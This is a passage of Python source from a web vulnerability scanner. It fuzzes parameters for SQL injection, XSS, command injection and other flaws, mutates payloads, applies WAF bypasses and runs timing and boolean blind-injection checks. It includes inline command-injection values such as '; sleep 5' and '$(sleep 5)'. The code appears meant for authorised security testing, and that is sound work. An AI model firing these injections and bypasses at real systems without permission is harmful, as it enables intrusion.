                failed_payloads = []  # Track failed payloads for mutation

                for payload in all_payloads[:max_payloads]:
                    self.rate_limiter.wait()

                    # Test without bypass first
                    success = self.test_single_payload(
                        endpoint, param, payload, vuln_type, None,
                        baseline_response=baseline_text
                    )
                    tested_count += 1
                    self.performance_monitor.increment_payloads()

                    if success:
                        found = True
                        break

                    failed_payloads.append(payload)

                    # If not successful, try with validated bypasses
                    if not success and self.bypass_manager and self.bypass_manager.validated_bypasses:
                        for bypass in self.bypass_manager.validated_bypasses:
                            self.rate_limiter.wait()
                            success = self.test_single_payload(
                                endpoint, param, payload, vuln_type, bypass,
                                baseline_response=baseline_text
                            )
                            if success:
                                found = True
                                break
                        if found:
                            break

                # ===== PHASE 2: Mutated payloads (if static failed) =====
                if not found and self.mutation_engine and failed_payloads:
                    # Mutate top 3 most promising payloads
                    mutation_candidates = failed_payloads[:3]
                    max_mutations_per_payload = 5
                    mutated_tested = 0

                    if self.verbose:
                        print(f"    Mutating {len(mutation_candidates)} payloads...")

                    for base_payload in mutation_candidates:
                        try:
                            mutations = self.mutation_engine.mutate(
                                base_payload,
                                vuln_type=vuln_type,
                                max_mutations=max_mutations_per_payload
                            )
                        except Exception as e:
                            logger.debug(f"Mutation error: {e}")
                            continue

                        for mutation in mutations:
                            mutated_payload = mutation.mutated if hasattr(mutation, 'mutated') else str(mutation)

                            # Skip if identical to original or already tested
                            if mutated_payload == base_payload or mutated_payload in failed_payloads:
                                continue

                            self.rate_limiter.wait()
                            success = self.test_single_payload(
                                endpoint, param, mutated_payload, vuln_type, None,
                                baseline_response=baseline_text
                            )
                            tested_count += 1
                            mutated_tested += 1
                            self.performance_monitor.increment_payloads()

                            if success:
                                found = True
                                if self.verbose:
                                    print(f"    Mutation hit! Base: {base_payload[:30]}... → {mutated_payload[:30]}...")
                                break

                        if found:
                            break

                    if self.verbose and mutated_tested > 0:
                        print(f"    Tested {mutated_tested} mutations")

                # ===== PHASE 3: Multi-request techniques (timing/boolean) =====
                if not found and vuln_type == 'sqli':
                    found = self._test_timing_sqli(endpoint, param)
                    if not found:
                        found = self._test_boolean_sqli(endpoint, param)

                if not found and vuln_type == 'rce':
                    found = self._test_timing_rce(endpoint, param)

                if self.verbose:
                    print(f"    Tested {tested_count} payloads for {vuln_type}")

                self.mark_parameter_tested(param_name, vuln_type, endpoint_url)

            except Exception as e:
                logger.error(f"Error testing {vuln_type} for {param_name}: {e}", exc_info=True)
                if self.verbose:
                    print(f"    ❌ Error testing {vuln_type}: {e}")
                # Mark as tested to avoid infinite retry, but continue to next vuln type
                self.mark_parameter_tested(param_name, vuln_type, endpoint_url)
                continue

    def _collect_all_payloads(self, vuln_type, endpoint=None):
        """
        Collect and deduplicate payloads from ALL sources:
        1. Native PayloadDB (smart, technique-specific payloads)
        2. External wordlists (SecLists, fuzzdb, etc.) - ENHANCED with intelligent scanner
        3. Internal fallback payloads

        Args:
            vuln_type: Tipo vulnerabilità
            endpoint: Endpoint dict (opzionale, per technology detection)

        Returns deduplicated list prioritizing native payloads first.
        """
        all_payloads = []
        max_per_source = 10

        # === Source 1: Native PayloadDB (highest priority - smart payloads) ===
        if PayloadDB is not None:
            native_payloads = []
            if vuln_type == 'sqli':
                native_payloads.extend(PayloadDB.SQLI_ERROR_BASED[:max_per_source])
                native_payloads.extend(PayloadDB.SQLI_UNION_BASED[:5])
            elif vuln_type == 'xss':
                native_payloads.extend(PayloadDB.XSS_BASIC[:max_per_source])
                native_payloads.extend(PayloadDB.XSS_FILTER_BYPASS[:5])
            elif vuln_type == 'rce':
                native_payloads.extend(getattr(PayloadDB, 'RCE_PAYLOADS', [])[:max_per_source])
            elif vuln_type == 'lfi':
                native_payloads.extend(getattr(PayloadDB, 'LFI_PAYLOADS', [])[:max_per_source])
            elif vuln_type == 'csrf':
                # CSRF testing: tentativo di eseguire azione senza token valido
                native_payloads = [
                    '',
                    ' ',
                    'invalid_token_12345',
                    'AAAAAAAAAAAAAAAA',
                    'stolen_token_xyz',
                ]
            elif vuln_type == 'xxe':
                native_payloads.extend(getattr(PayloadDB, 'XXE_PAYLOADS', [])[:max_per_source])
            elif vuln_type == 'crlf':
                native_payloads.extend(getattr(PayloadDB, 'CRLF_PAYLOADS', [])[:max_per_source])
            elif vuln_type == 'ssti':
                native_payloads.extend(getattr(PayloadDB, 'SSTI_PAYLOADS', [])[:max_per_source])
            elif vuln_type == 'xpath':
                native_payloads.extend(getattr(PayloadDB, 'XPATH_PAYLOADS', [])[:max_per_source])

            all_payloads.extend(native_payloads)

        # === Source 2: External wordlists (ENHANCED) ===
        technology = self._detect_technology_from_endpoint(endpoint) if endpoint else None

        wordlists = self.wordlist_mapper.get_wordlists_for_vulnerability(
            vuln_type, technology=technology
        )

        if self.verbose and wordlists:
            print(f"      📚 Found {len(wordlists)} wordlist files for {vuln_type}" +
                  (f" (tech: {technology})" if technology else ""))

        # Use intelligent loader if available, otherwise old per-file reading
        if self.wordlist_mapper.use_intelligent_scan and wordlists:
            wordlist_paths = [wl['path'] for wl in wordlists]
            wordlist_payloads = self.wordlist_mapper.load_payloads_from_files(
                wordlist_paths,
                max_payloads=150
            )
            all_payloads.extend(wordlist_payloads)
        else:
            for wordlist in wordlists[:3]:
                if not os.path.exists(wordlist['path']):
                    continue
                try:
                    with open(wordlist['path'], 'r', encoding='utf-8', errors='ignore') as f:
                        count = 0
                        for line in itertools.islice(f, max_per_source * 10):
                            line = line.strip()
                            if not line or line.startswith('#'):
                                continue
                            if self._is_valid_payload(line):
                                all_payloads.append(line)
                                count += 1
                                if count >= max_per_source:
                                    break
                except Exception as e:
                    logger.error(f"Error reading wordlist {wordlist['path']}: {e}")

        # === Source 3: Internal fallback (if nothing else available) ===
        if not all_payloads:
            internal_payloads = self.wordlist_mapper.get_internal_payloads(vuln_type)
            if internal_payloads:
                all_payloads.extend(internal_payloads[:max_per_source * 2])

        # Deduplicate preserving order (native payloads first)
        seen = set()
        unique_payloads = []
        for p in all_payloads:
            if p not in seen:
                seen.add(p)
                unique_payloads.append(p)

        return unique_payloads

    def _detect_technology_from_endpoint(self, endpoint):
        """
        Detect technology stack from endpoint for technology-specific payloads.

        Returns:
            Technology string (mysql, php, etc.) or None
        """
        if not endpoint:
            return None

        url = endpoint.get('url', '').lower()

        # Check detected tech (se disponibile)
        if hasattr(self, 'detected_tech') and self.detected_tech:
            tech = str(self.detected_tech).lower()
            if 'mysql' in tech or 'mariadb' in tech:
                return 'mysql'
            if 'postgresql' in tech or 'postgres' in tech:
                return 'postgresql'
            if 'mssql' in tech or 'sqlserver' in tech:
                return 'mssql'
            if 'oracle' in tech:
                return 'oracle'

        # Fallback: euristica da URL
        if '.php' in url or 'php' in url:
            return 'php'
        if '.asp' in url or 'aspx' in url:
            return 'asp'
        if '.jsp' in url or 'java' in url:
            return 'java'

        return None

    def _test_timing_sqli(self, endpoint, param):
        """
        Test for time-based blind SQL injection.

        Sends SLEEP/WAITFOR payloads and measures response time.
        Verifies by sending a non-delayed version to confirm the delay was caused by the payload.

        Returns:
            True if time-based SQLi confirmed, False otherwise
        """
        if PayloadDB is None:
            return False

        url = endpoint['url']
        param_name = param['name']
        method = endpoint.get('method', 'GET')
        time_threshold = 4.0  # Expect ~5s delay

        if self.verbose:
            print(f"    Testing time-based blind SQLi...")

        for payload in PayloadDB.SQLI_TIME_BASED[:5]:
            try:
                self.rate_limiter.wait()

                # Send delayed payload
                start_time = time.time()
                response = self._send_raw_payload(endpoint, param, payload)
                elapsed = time.time() - start_time

                if response is None:
                    continue

                if self.verbose:
                    print(f"      Timing test: '{payload[:40]}...' -> {elapsed:.2f}s")

                if elapsed >= time_threshold:
                    # Verify: send non-delayed version
                    verify_payload = payload.replace('5', '0').replace("'0:0:5'", "'0:0:0'")
                    self.rate_limiter.wait()
                    start_verify = time.time()
                    self._send_raw_payload(endpoint, param, verify_payload)
                    verify_elapsed = time.time() - start_verify

                    if elapsed - verify_elapsed >= time_threshold * 0.8:
                        confidence = 90
                        if self.verbose:
                            print(f"    CONFIRMED time-based SQLi (delay: {elapsed:.1f}s)")

                        self.vuln_logger.log_vulnerability(
                            endpoint=url,
                            parameter=param_name,
                            payload=payload,
                            vulnerability_type='SQLI',
                            confidence=confidence
                        )

                        self.results['vulnerability_test_results'].append({
                            'endpoint': url,
                            'parameter': param_name,
                            'vulnerability_type': 'sqli',
                            'payload': payload,
                            'technique': 'time_based',
                            'bypass_used': None,
                            'response_status': response.status_code,
                            'response_length': len(response.content),
                            'timestamp': time.strftime('%H:%M:%S'),
                            'confidence': confidence
                        })
                        self.performance_monitor.increment_vulnerabilities()
                        return True

            except Exception as e:
                logger.debug(f"Time-based test error: {e}")

        return False

    def _test_boolean_sqli(self, endpoint, param):
        """
        Test for boolean-based blind SQL injection.

        Sends TRUE/FALSE condition pairs and compares responses.
        If TRUE response matches baseline but FALSE differs significantly -> SQLi.

        Returns:
            True if boolean-based SQLi confirmed, False otherwise
        """
        if PayloadDB is None:
            return False

        url = endpoint['url']
        param_name = param['name']

        if self.verbose:
            print(f"    Testing boolean-based blind SQLi...")

        try:
            # Get baseline response using actual parameter value (not hardcoded)
            # Priority: 1) param['value'], 2) param['value_sample'], 3) fallback to '1'
            baseline_value = param.get('value', '') or param.get('value_sample', '') or '1'

            if self.verbose:
                print(f"      Using baseline value: {baseline_value}")

            self.rate_limiter.wait()
            baseline = self._send_raw_payload(endpoint, param, baseline_value)
            if baseline is None:
                return False
            baseline_text = baseline.text[:5000] if baseline.text else ""
            baseline_size = len(baseline.content)

        except Exception:
            return False

        if self.verbose:
            print(f"      Baseline: value='{baseline_value}', size={len(baseline.content)}")

        similarity_threshold = 0.75

        for true_payload, false_payload in PayloadDB.SQLI_BOOLEAN_BASED[:5]:
            try:
                self.rate_limiter.wait()
                true_resp = self._send_raw_payload(endpoint, param, true_payload)
                self.rate_limiter.wait()
                false_resp = self._send_raw_payload(endpoint, param, false_payload)

                if true_resp is None or false_resp is None:
                    continue

                if self.verbose:
                    print(f"      Testing: TRUE='{true_payload[:30]}...' vs FALSE='{false_payload[:30]}...'")

                true_text = true_resp.text[:5000] if true_resp.text else ""
                false_text = false_resp.text[:5000] if false_resp.text else ""

                # Calculate similarity ratios using semantic differ
                # (ignores CSRF tokens, session IDs, timestamps that change between requests)
                true_sim = SemanticResponseDiffer.similarity(baseline_text, true_text)
                false_sim = SemanticResponseDiffer.similarity(baseline_text, false_text)
                true_false_sim = SemanticResponseDiffer.similarity(true_text, false_text)

                true_size = len(true_resp.content)
                false_size = len(false_resp.content)
                # baseline_size already computed above from initial baseline request
                size_differential = abs(true_size - false_size)
                true_vs_baseline = abs(true_size - baseline_size)

                if self.verbose:
                    print(f"      TRUE={true_payload[:30]}... → size={true_size}")
                    print(f"      FALSE={false_payload[:30]}... → size={false_size}")
                    print(f"      Differential: {size_differential}, baseline_diff: {true_vs_baseline}")
                    print(f"        Similarity: true={true_sim:.2f}, false={false_sim:.2f}, diff={true_false_sim:.2f}")
                    print(f"        Size: baseline={baseline_size}, true={true_size}, false={false_size}, diff={size_differential}")

                # Primary condition: similarity
                similarity_match = (
                    true_sim > similarity_threshold and
                    false_sim < similarity_threshold and
                    true_false_sim < similarity_threshold
                )
                # Fallback: size differential
                # true close to baseline, false significantly different
                size_match = (
                    size_differential > 50 and
                    true_vs_baseline < size_differential and
                    true_vs_baseline < 200
                )

                if similarity_match or size_match:

                    confidence = 85
                    if self.verbose:
                        print(f"    CONFIRMED boolean-based SQLi (similarity: {true_false_sim:.2f})")

                    combined_payload = f"TRUE: {true_payload} / FALSE: {false_payload}"
                    self.vuln_logger.log_vulnerability(
                        endpoint=url,
                        parameter=param_name,
                        payload=combined_payload,
                        vulnerability_type='SQLI',
                        confidence=confidence
                    )

                    self.results['vulnerability_test_results'].append({
                        'endpoint': url,
                        'parameter': param_name,
                        'vulnerability_type': 'sqli',
                        'payload': combined_payload,
                        'technique': 'boolean_based',
                        'bypass_used': None,
                        'response_status': true_resp.status_code,
                        'response_length': len(true_resp.content),
                        'timestamp': time.strftime('%H:%M:%S'),
                        'confidence': confidence
                    })
                    self.performance_monitor.increment_vulnerabilities()
                    return True

            except Exception as e:
                logger.debug(f"Boolean-based test error: {e}")

        return False

    def _test_timing_rce(self, endpoint, param):
        """
        Test for time-based blind Command Injection / RCE.

        Sends sleep/ping delay payloads and measures response time.
        Verifies with non-delayed version to confirm causality.

        Returns:
            True if time-based RCE confirmed, False otherwise
        """
        url = endpoint['url']
        param_name = param['name']
        time_threshold = 4.0

        if self.verbose:
            print(f"    Testing time-based blind RCE...")

        timing_payloads = [
            ('; sleep 5', '; sleep 0'),
            ('| sleep 5', '| sleep 0'),
            ('& sleep 5', '& sleep 0'),
            ('`sleep 5`', '`sleep 0`'),
            ('$(sleep 5)', '$(sleep 0)'),
            ('; ping -c 5 127.0.0.1', '; echo ok'),
            ('| ping -c 5 127.0.0.1', '| echo ok'),
        ]

        for delay_payload, verify_payload in timing_payloads:
            try:
                self.rate_limiter.wait()

                # Send delayed payload
                start_time = time.time()
                response = self._send_raw_payload(endpoint, param, delay_payload)
                elapsed = time.time() - start_time

                if response is None:
                    continue

                if elapsed >= time_threshold:
                    # Verify: send non-delayed version
                    self.rate_limiter.wait()
                    start_verify = time.time()
                    verify_resp = self._send_raw_payload(endpoint, param, verify_payload)
                    verify_elapsed = time.time() - start_verify

                    if verify_resp and elapsed - verify_elapsed >= time_threshold * 0.7:
                        confidence = 90

                        if self.verbose:
                            print(f"    CONFIRMED time-based RCE: {elapsed:.2f}s vs {verify_elapsed:.2f}s")

                        self.vuln_logger.log_vulnerability(
                            endpoint=url,
                            parameter=param_name,
                            payload=delay_payload,
                            vulnerability_type='RCE',
                            confidence=confidence
                        )

                        self.results['vulnerability_test_results'].append({
                            'endpoint': url,
                            'parameter': param_name,
                            'vulnerability_type': 'rce',
                            'payload': delay_payload,
                            'technique': 'time_based',
                            'bypass_used': None,
                            'response_status': response.status_code,
                            'response_length': len(response.content),
                            'timestamp': time.strftime('%H:%M:%S'),
                            'confidence': confidence
                        })
                        self.performance_monitor.increment_vulnerabilities()
                        return True

            except Exception as e:
                logger.debug(f"Time-based RCE test error: {e}")

        return False

    def _send_raw_payload(self, endpoint, param, payload):
        """
        Send a single payload and return the raw response.
        Used by timing/boolean techniques that need direct response access.

        Returns:
            requests.Response or None on error
        """
        try:
            base_url = endpoint['url']
            param_name = param['name']
            method = endpoint.get('method', 'GET')

            # Circuit breaker check
            if base_url in self._url_circuit_broken:
                return None

            if method.upper() == 'GET':
                separator = '&' if '?' in base_url else '?'
                test_url = f"{base_url}{separator}{param_name}={urllib.parse.quote(payload)}"
                # Add other form parameters (e.g. Submit=Submit)
                for p in endpoint.get('parameters', []):
                    p_name = p.get('name', '')
                    if p_name and p_name != param_name:
                        p_value = p.get('value', '') or ''
                        test_url += f"&{urllib.parse.quote(p_name)}={urllib.parse.quote(p_value)}"
                resp = self.session.get(test_url, timeout=10, verify=False, allow_redirects=True)
            else:
                post_data = {param_name: payload}
                for p in endpoint.get('parameters', []):
                    p_name = p.get('name', '')
                    if p_name and p_name != param_name:
                        post_data[p_name] = p.get('value', '') or ''
                resp = self.session.post(base_url, data=post_data, timeout=10, verify=False, allow_redirects=True)

            # Detect WAF block vs real session loss
            if resp and resp.url:
                final_url_lower = resp.url.lower()
                if final_url_lower != base_url.lower():
                    # PHPIDS/WAF redirect - payload blocked but session is valid
                    if 'phpids=' in final_url_lower or 'waf' in final_url_lower:
                        logger.debug(f"WAF/IDS blocked raw payload: {resp.url}")
                        return None

                    # Real session loss - login redirect
                    login_indicators = ['login.php', 'signin', '/auth']
                    if any(ind in final_url_lower for ind in login_indicators):
                        logger.warning(f"Session lost in raw payload: redirected to {resp.url}")
                        self._try_reauth()
                        return None

            return resp

        except Exception as e:
            logger.debug(f"Raw payload send error: {e}")
            return None

    def _sync_native_detector_cookies(self):
        """Sync session cookies with native detector for authenticated testing"""
        if not self.native_detector:
            return

        try:
            if hasattr(self.session, 'cookies') and self.session.cookies:
                cookies_dict = dict(self.session.cookies)
                if cookies_dict:
                    self.native_detector.session.cookies.update(cookies_dict)
                    if self.verbose:
                        print(f"  🔄 Synced {len(cookies_dict)} cookies with native detector")
        except Exception as e:
            logger.warning(f"Failed to sync native detector session: {e}")

    def _try_reauth(self):
        """
        Try to re-authenticate when session is lost.
        Returns True if re-authentication succeeded.
        """
        if not hasattr(self, '_reauth_lock'):
            self._reauth_lock = False
            self._reauth_count = 0

        # Prevent concurrent re-auth attempts and limit total retries
        if self._reauth_lock or self._reauth_count >= 5:
            return False

        self._reauth_lock = True
        try:
            if (self.auth_manager and self.auth_manager.auth_config):
                logger.info("Attempting session re-authentication...")
                result = self.auth_manager.setup_authentication(
                    self.session, self.auth_manager.auth_config
                )
                if result:
                    self._reauth_count += 1
                    self._sync_native_detector_cookies()
                    logger.info("Session re-authenticated successfully")
                    if self.verbose:
                        print(f"      🔄 Session re-authenticated (attempt {self._reauth_count}/5)")
                    return True
                else:
                    logger.warning("Re-authentication failed")
            return False
        except Exception as e:
            logger.error(f"Re-authentication error: {e}")
            return False
        finally:
            self._reauth_lock = False

    def test_with_wordlists(self, endpoint, param, vuln_type, wordlists):
        """
        Test vulnerability using wordlists and bypasses con lazy loading.

        Migliorie:
        - Lazy loading con itertools.islice (no caricamento file interi)
        - Payload validation per skippare payload invalidi
        - Rate limiting integrato
        - Performance monitoring
        - ⚠️ FALLBACK a payload interni se wordlist esterni non disponibili
        """
        tested_payloads = set()  # Per evitare duplicati
        max_payloads_per_list = 10  # Limit for immediate testing

        # Collect payloads con LAZY LOADING da file esterni
        all_payloads = []
        external_loaded = False

        for wordlist in wordlists[:3]:  # Limit to first 3 wordlists
            if not os.path.exists(wordlist['path']):
                continue

            try:
                with open(wordlist['path'], 'r', encoding='utf-8', errors='ignore') as f:
                    # ⚡ LAZY LOADING: leggi solo i payload necessari, non tutto il file
                    payload_count = 0
                    for line in itertools.islice(f, max_payloads_per_list * 10):  # Max 100 lines per file
                        line = line.strip()
                        # Skippa commenti e righe vuote
                        if not line or line.startswith('#'):
                            continue

                        # ✅ PAYLOAD VALIDATION
                        if self._is_valid_payload(line):
                            all_payloads.append(line)
                            payload_count += 1
                            if payload_count >= max_payloads_per_list:
                                break

                if payload_count > 0:
                    external_loaded = True
                    if self.verbose:
                        print(f"    📚 Loaded {payload_count} payloads from: {wordlist['source']}/{wordlist['relative_path']}")

            except IOError as e:
                logger.error(f"IO error reading wordlist {wordlist['path']}: {e}")
                self.performance_monitor.increment_errors()
            except Exception as e:
                logger.error(f"Unexpected error reading wordlist {wordlist['path']}: {e}", exc_info=True)
                self.performance_monitor.increment_errors()
                continue

        # ⚠️ FALLBACK: se nessun wordlist esterno disponibile, usa payload interni
        if not all_payloads:
            internal_payloads = self.wordlist_mapper.get_internal_payloads(vuln_type)
            if internal_payloads:
                all_payloads = internal_payloads[:max_payloads_per_list * 2]
                if self.verbose:
                    print(f"    🔧 Using {len(all_payloads)} INTERNAL fallback payloads for {vuln_type.upper()}")
            else:
                if self.verbose:
                    print(f"    ⚠️ No payloads available for {vuln_type} (external or internal)")
                return

        # Sort and unique (sort | uniq)
        unique_payloads = sorted(list(set(all_payloads)))

        if self.verbose:
            source_type = "external" if external_loaded else "internal"
            print(f"    📊 Total unique payloads: {len(unique_payloads)} ({source_type})")

        # Limita payloads da testare
        payloads_to_test = unique_payloads[:max_payloads_per_list * 2]

        # ⚡ PARALLELIZZAZIONE PAYLOAD TESTING
        # Se abbiamo molti payload (>5), testa in parallelo
        if len(payloads_to_test) > 5:
            tested_count = self._test_payloads_parallel(
                endpoint, param, payloads_to_test, vuln_type, tested_payloads,
                max_workers=3  # 3 payload in parallelo
            )
        else:
            # SEQUENZIALE: per pochi payload
            tested_count = 0
            for payload in payloads_to_test:
                if tested_count >= max_payloads_per_list * 2:
                    break

                # ⚡ Rate limiting
                self.rate_limiter.wait()

                # Test without bypass first
                success = self.test_single_payload(endpoint, param, payload, vuln_type, None)

                if not success and self.bypass_manager and self.bypass_manager.validated_bypasses:
                    # Test with each validated bypass
                    for bypass in self.bypass_manager.validated_bypasses:
                        if self.verbose:
                            print(f"      🔧 Applying bypass: {bypass['type']}")

                        self.rate_limiter.wait()
                        success = self.test_single_payload(endpoint, param, payload, vuln_type, bypass)
                        if success:
                            break  # Stop trying bypasses once one works

                tested_count += 1
                tested_payloads.add(payload)

                # Incrementa contatore performance
                self.performance_monitor.increment_payloads()

        if self.verbose:
            print(f"    ✅ Tested {tested_count} unique payloads for {vuln_type}")

    def _test_payloads_parallel(self, endpoint, param, payloads, vuln_type, tested_payloads, max_workers=3):
        """
        Testa payload in parallelo usando ThreadPoolExecutor.

        Args:
            endpoint: Endpoint dictionary
            param: Parameter dictionary
            payloads: Lista di payload da testare
            vuln_type: Tipo di vulnerabilità
            tested_payloads: Set di payload già testati
            max_workers: Numero di thread paralleli

        Returns:
            Numero di payload testati
        """
        tested_count = 0

        def test_payload_wrapper(payload):
            """Wrapper per testare singolo payload (per ThreadPoolExecutor)"""
            # Rate limiting
            self.rate_limiter.wait()

            # Test without bypass first
            success = self.test_single_payload(endpoint, param, payload, vuln_type, None)

            # Se non ha successo, prova con bypass
            if not success and self.bypass_manager and self.bypass_manager.validated_bypasses:
                for bypass in self.bypass_manager.validated_bypasses:
                    self.rate_limiter.wait()
                    success = self.test_single_payload(endpoint, param, payload, vuln_type, bypass)
                    if success:
                        break  # Stop trying bypasses once one works

            # Incrementa contatore performance
            self.performance_monitor.increment_payloads()
            return payload, success

        # Esegui in parallelo
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            # Sottometti tutti i task
            future_to_payload = {
                executor.submit(test_payload_wrapper, payload): payload
                for payload in payloads
            }

            # Processa risultati man mano che completano
            for future in concurrent.futures.as_completed(future_to_payload):
                try:
                    payload, success = future.result()
                    tested_payloads.add(payload)
                    tested_count += 1

                    if success and self.verbose:
                        print(f"      ✅ Payload succeeded: {payload[:30]}...")
                except Exception as e:
                    logger.error(f"Error in parallel payload testing: {e}", exc_info=True)
                    self.performance_monitor.increment_errors()

        return tested_count

    def _is_valid_payload(self, payload):
        """
        Valida un payload prima di testarlo.

        Skippa:
        - Payload vuoti o troppo lunghi (>10k)
        - Payload con caratteri non-printable
        - Payload già testati (hash check)

        Returns:
            True se payload è valido, False altrimenti
        """
        # Controllo lunghezza
        if not payload or len(payload) > 10000:
            return False

        # Controllo caratteri printable (permetti alcuni caratteri speciali comuni)
        # Permettiamo: lettere, numeri, spazi, punteggiatura comune, newline, tab
        try:
            # Verifica se contiene troppi caratteri non-ASCII o control characters
            non_printable = sum(1 for c in payload if ord(c) < 32 and c not in '\n\r\t')
            if non_printable > len(payload) * 0.3:  # Max 30% caratteri non-printable
                return False
        except:
            return False

        # NOTE: Payload dedup is now handled per-endpoint in test_vulnerability_immediately()
        # to avoid blocking the same payload from being tested on different URLs.
        # Global dedup was causing missed detections (e.g. same SQLi payload skipped
        # on /sqli_blind/ after being tested on /sqli/).

        return True
    
    def test_single_payload(self, endpoint, param, payload, vuln_type, bypass=None,
                           baseline_response=None):
        """
        Test a single payload against an endpoint.

        Migliorie:
        - Rate limiting integrato
        - Performance monitoring
        - Error handling migliorato con eccezioni specifiche
        - Response cleanup automatico
        - Baseline comparison per differential analysis
        - Response time measurement per time-based detection
        """
        response = None
        try:
            # Build test URL
            base_url = endpoint['url']
            param_name = param['name']

            # Circuit breaker: skip URLs with too many consecutive failures
            if base_url in self._url_circuit_broken:
                return False

            # Determine how to inject payload
            post_data = None
            method = endpoint.get('method', 'GET')

            if method.upper() == 'GET':
                # GET request - add payload to URL parameters
                # Also include other form fields (e.g. Submit=Submit) which many apps require
                separator = '&' if '?' in base_url else '?'
                test_url = f"{base_url}{separator}{param_name}={urllib.parse.quote(payload)}"
                # Add other form parameters to GET URL (critical for forms like DVWA)
                for p in endpoint.get('parameters', []):
                    p_name = p.get('name', '')
                    if p_name and p_name != param_name:
                        p_value = p.get('value', '') or ''
                        test_url += f"&{urllib.parse.quote(p_name)}={urllib.parse.quote(p_value)}"
            else:
                # POST request - build form data with payload
                test_url = base_url
                post_data = {param_name: payload}

                # Add other form fields from endpoint with their default values
                for p in endpoint.get('parameters', []):
                    p_name = p.get('name', '')
                    if p_name and p_name != param_name:
                        post_data[p_name] = p.get('value', '') or ''

            # Apply bypass if provided
            if bypass:
                request_params = self.bypass_manager.apply_bypass_to_request(
                    test_url, bypass, payload, endpoint.get('method', 'GET')
                )
                if not request_params:
                    return False
                # Ensure POST data is included for bypasses too
                if post_data and 'data' not in request_params:
                    request_params['data'] = post_data
            else:
                request_params = {
                    'url': test_url,
                    'method': endpoint.get('method', 'GET'),
                    'timeout': 10,
                    'verify': False,
                    'allow_redirects': True
                }
                # Add POST data if this is a POST request
                if post_data:
                    request_params['data'] = post_data

            # ⚡ Rate limiting
            self.rate_limiter.wait()

            # Make request with timing measurement
            request_start = time.time()
            try:
                if request_params['method'].upper() == 'GET':
                    response = self.session.get(
                        request_params['url'],
                        headers=request_params.get('headers'),
                        timeout=request_params['timeout'],
                        verify=request_params['verify'],
                        allow_redirects=request_params['allow_redirects']
                    )
                else:
                    response = self.session.post(
                        request_params['url'],
                        headers=request_params.get('headers'),
                        data=request_params.get('data'),
                        timeout=request_params['timeout'],
                        verify=request_params['verify'],
                        allow_redirects=request_params['allow_redirects']
                    )

                # Incrementa contatore HTTP requests
                self.performance_monitor.increment_requests()

                # Reset error count on success (circuit breaker)
                if base_url in self._url_error_counts:
                    self._url_error_counts[base_url] = 0

                # Detect WAF/IDS block vs real session loss
                final_url = response.url if response.url else ''
                if final_url != request_params['url']:
                    final_url_lower = final_url.lower()

                    # PHPIDS/WAF redirect (security.php?phpids=...) - NOT session loss
                    # The payload was detected by the WAF but session is still valid
                    if 'phpids=' in final_url_lower or 'waf' in final_url_lower or 'blocked' in final_url_lower:
                        logger.debug(f"WAF/IDS blocked payload: {final_url}")
                        return False

                    # Real session loss: redirect to login page
                    login_indicators = ['login.php', 'signin', '/auth']
                    if any(ind in final_url_lower for ind in login_indicators):
                        logger.warning(f"Session lost: redirected to {final_url}")
                        # Try to re-authenticate
                        if self._try_reauth():
                            if self.verbose:
                                print(f"      🔄 Session restored, retrying payload")
                            # Don't retry the payload here - just let the loop continue
                        elif self.verbose:
                            print(f"      ⚠️ Session lost: redirected to {final_url}")
                        return False

                    # security.php WITHOUT phpids= could be the security settings page
                    # (e.g. DVWA redirects here when security level requires login)
                    if 'security.php' in final_url_lower and 'phpids' not in final_url_lower:
                        # Check if this is a login redirect by trying to access the original URL
                        logger.debug(f"Redirect to security.php (no phpids) - checking session validity")
                        return False

            except requests.Timeout:
                # Timeout can indicate time-based vulnerability (sleep/ping)
                elapsed = time.time() - request_start
                if vuln_type == 'rce' and elapsed >= 4.0:
                    logger.info(f"Timeout may indicate time-based RCE: {elapsed:.2f}s")
                else:
                    # Track consecutive timeouts for circuit breaker
                    self._url_error_counts[base_url] = self._url_error_counts.get(base_url, 0) + 1
                    if self._url_error_counts[base_url] >= self._CIRCUIT_BREAKER_THRESHOLD:
                        self._url_circuit_broken.add(base_url)
                        logger.warning(f"Circuit breaker: skipping {base_url} after {self._CIRCUIT_BREAKER_THRESHOLD} consecutive timeouts")
                        if self.verbose:
                            print(f"      ⚡ Circuit breaker activated for {base_url}")
                logger.warning(f"Timeout testing payload on {base_url}")
                self.performance_monitor.increment_errors()
                return False
            except requests.ConnectionError as e:
                self._url_error_counts[base_url] = self._url_error_counts.get(base_url, 0) + 1
                if self._url_error_counts[base_url] >= self._CIRCUIT_BREAKER_THRESHOLD:
                    self._url_circuit_broken.add(base_url)
                    logger.warning(f"Circuit breaker: skipping {base_url} after repeated connection errors")
                logger.warning(f"Connection error testing payload on {base_url}: {e}")
                self.performance_monitor.increment_errors()
                return False
            except requests.RequestException as e:
                logger.error(f"Request error testing payload on {base_url}: {e}")
                self.performance_monitor.increment_errors()
                return False

            response_time = time.time() - request_start

            # Analyze response for vulnerability indicators (with baseline and timing)
            vulnerability_detected = self.analyze_response_for_vulnerability(
                response, payload, vuln_type, bypass,
                baseline_response=baseline_response,
                response_time=response_time
            )
            
            if vulnerability_detected:
                # Incrementa contatore vulnerabilità
                self.performance_monitor.increment_vulnerabilities()

                # Record successful test
                test_result = {
                    'endpoint': endpoint['url'],
                    'parameter': param_name,
                    'vulnerability_type': vuln_type,
                    'payload': payload,
                    'bypass_used': bypass['type'] if bypass else None,
                    'response_status': response.status_code,
                    'response_length':  len(response.content),
                    'timestamp': time.strftime('%H:%M:%S'),
                    'confidence': 85 if bypass else 75
                }

                self.results['vulnerability_test_results'].append(test_result)

                # ✅ SALVA IMMEDIATAMENTE SU FILE CON TUTTI I DETTAGLI
                self.vuln_logger.log_vulnerability(
                    endpoint=endpoint['url'],
                    parameter=param_name,
                    payload=payload,
                    vulnerability_type=vuln_type,  # XSS, SQLI, LFI, RCE, etc.
                    bypass_used=bypass['type'] if bypass else None,
                    response_status=response.status_code,
                    response_length=len(response.content),
                    method=request_params['method'],  # Passa il metodo reale utilizzato
                    headers=dict(response.request.headers),  # Usa gli header della richiesta effettiva
                    confidence=85 if bypass else 75
                )

                if self.verbose:
                    bypass_info = f" with {bypass['type']}" if bypass else ""
                    print(f"      🚨 VULNERABILITY DETECTED{bypass_info}!")
                    print(f"         Type: {vuln_type.upper()}")
                    print(f"         Payload: {payload[:50]}{'...' if len(payload) > 50 else ''}")
                    print(f"         Status: {response.status_code}, Length: {len(response.content)}")
                    print(f"         Method: {endpoint.get('method', 'GET')}")
                    print(f"         📁 Saved to: {self.vuln_logger.get_output_dir()}")

                return True

            elif self.verbose:
